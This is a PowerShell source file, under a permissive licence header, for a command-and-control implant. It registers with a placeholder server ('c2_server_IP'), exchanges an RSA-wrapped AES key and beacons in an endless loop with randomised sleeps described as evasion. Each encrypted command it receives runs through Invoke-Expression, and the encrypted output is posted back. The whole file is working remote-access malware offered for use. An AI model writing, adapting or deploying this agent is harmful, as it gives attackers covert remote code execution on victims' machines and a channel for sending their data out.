########################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#########################################################################################################################################################################################################################

$ErrorActionPreference = "Stop"

# Function to load or generate AgentID
Function Load-AgentID {
    Param ([string]$FilePath)
    If (Test-Path $FilePath) {
        $AgentID = (Get-Content $FilePath -Raw).Trim()
        return $AgentID
    } Else {
        $AgentID = [guid]::NewGuid().ToString()
        Set-Content -Path $FilePath -Value $AgentID
        return $AgentID
    }
}

# Function to send beacon to C2 server with time-based evasion
Function Send-Beacon {
    Param ([string]$AgentID, [string]$C2Url, [byte[]]$AESKey)
    Try {
        $Body = @{ AgentID = $AgentID } | ConvertTo-Json -Compress
        $Body = [System.Text.Encoding]::UTF8.GetBytes($Body)

        Write-Host "[*] Sending beacon..."
        $Response = Invoke-RestMethod -Uri "$C2Url/beacon" -Method POST -Body $Body -ContentType "application/json; charset=utf-8"
        $EncryptedCommand = $Response.data

        $AES = New-Object System.Security.Cryptography.AesManaged
        $AES.Key = $AESKey
        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $CommandBytes = [Convert]::FromBase64String($EncryptedCommand)
        $IV = $CommandBytes[0..15]
        $CipherText = $CommandBytes[16..($CommandBytes.Length - 1)]
        $Decryptor = $AES.CreateDecryptor($AES.Key, $IV)
        $Command = [System.Text.Encoding]::UTF8.GetString($Decryptor.TransformFinalBlock($CipherText, 0, $CipherText.Length))

        If ($Command -ne "NoCommand") {
            Write-Host "[*] Executing command: $Command"
            $Result = Invoke-Expression $Command | Out-String
            $Result = $Result -replace "`r`n", "`n"
            Send-Result -AgentID $AgentID -C2Url $C2Url -Result $Result -AESKey $AESKey
        }
    } Catch {
        $_ | Out-File -FilePath "C:\Temp\powershell_error.log" -Append
    }
}

# Function to send execution result
Function Send-Result {
    Param ([string]$AgentID, [string]$C2Url, [string]$Result, [byte[]]$AESKey)
    Try {
        $AES = New-Object System.Security.Cryptography.AesManaged
        $AES.Key = $AESKey
        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $Encryptor = $AES.CreateEncryptor()
        $ResultBytes = [System.Text.Encoding]::UTF8.GetBytes($Result)
        $CipherText = $Encryptor.TransformFinalBlock($ResultBytes, 0, $ResultBytes.Length)
        $IV = $AES.IV
        $EncryptedResult = [Convert]::ToBase64String($IV + $CipherText)
        
        $Body = @{ AgentID = $AgentID; Result = $EncryptedResult } | ConvertTo-Json -Compress
        $Body = [System.Text.Encoding]::UTF8.GetBytes($Body)

        Write-Host "[*] Sending result..."
        Invoke-RestMethod -Uri "$C2Url/result" -Method POST -Body $Body -ContentType "application/json; charset=utf-8"
    } Catch {
        $_ | Out-File -FilePath "C:\Temp\powershell_error.log" -Append
    }
}

# Main execution
Try {
    $AgentIDFilePath = "C:\Temp\agent_id.txt"
    $AgentID = Load-AgentID -FilePath $AgentIDFilePath
    $C2Url = "http://c2_server_IP:8000"

    Write-Host "[*] Fetching Public Key..."
    $PublicKeyResponse = Invoke-RestMethod -Uri "$C2Url/public_key" -Method GET
    If (-Not $PublicKeyResponse.PublicKey) { Throw "[-] Failed to retrieve public key" }
    $PublicKeyXML = $PublicKeyResponse.PublicKey

    Function Import-RSAKey ($PublicKeyXML) {
        $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider
        $rsa.FromXmlString($PublicKeyXML)
        return $rsa
    }
    $RSA = Import-RSAKey $PublicKeyXML

    # Generate AES Key with polymorphic behavior
    $AESKey = New-Object byte[] 32
    [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($AESKey)
    $AESKeyBase64 = [Convert]::ToBase64String($AESKey)
    
    # Encrypt AES Key with RSA
    $EncryptedAESKey = $RSA.Encrypt($AESKey, $true)
    $EncryptedAESKeyBase64 = [Convert]::ToBase64String($EncryptedAESKey)
    
    $Body = @{ AgentID = $AgentID; EncAESKey = $EncryptedAESKeyBase64 } | ConvertTo-Json -Compress
    $Body = [System.Text.Encoding]::UTF8.GetBytes($Body)

    Write-Host "[*] Sending encrypted AES key..."
    $Response = Invoke-RestMethod -Uri "$C2Url/exchange_key" -Method POST -Body $Body -ContentType "application/json; charset=utf-8"
    If ($Response.Status -ne "Success") { Throw "[-] Key exchange failed." }

    # Check-in
    $CheckinBody = @{ AgentID = $AgentID } | ConvertTo-Json -Compress
    $CheckinBody = [System.Text.Encoding]::UTF8.GetBytes($CheckinBody)
    Invoke-RestMethod -Uri "$C2Url/checkin" -Method POST -Body $CheckinBody -ContentType "application/json; charset=utf-8"
    
    Write-Host "[*] Agent check-in completed."

    # Time-based evasion
    $SleepTime = Get-Random -Minimum 10 -Maximum 60
    Write-Host "[*] Sleeping for $SleepTime seconds before starting beacon loop."
    Start-Sleep -Seconds $SleepTime

    While ($true) {
        Try {
            Send-Beacon -AgentID $AgentID -C2Url $C2Url -AESKey $AESKey
        } Catch {
            $_ | Out-File -FilePath "C:\Temp\powershell_error.log" -Append
        }
        $DynamicSleep = Get-Random -Minimum 10 -Maximum 30
        Start-Sleep -Seconds $DynamicSleep
    }
}
Catch {
    $_ | Out-File -FilePath "C:\Temp\powershell_error.log" -Append
    Start-Sleep -Seconds 10
}
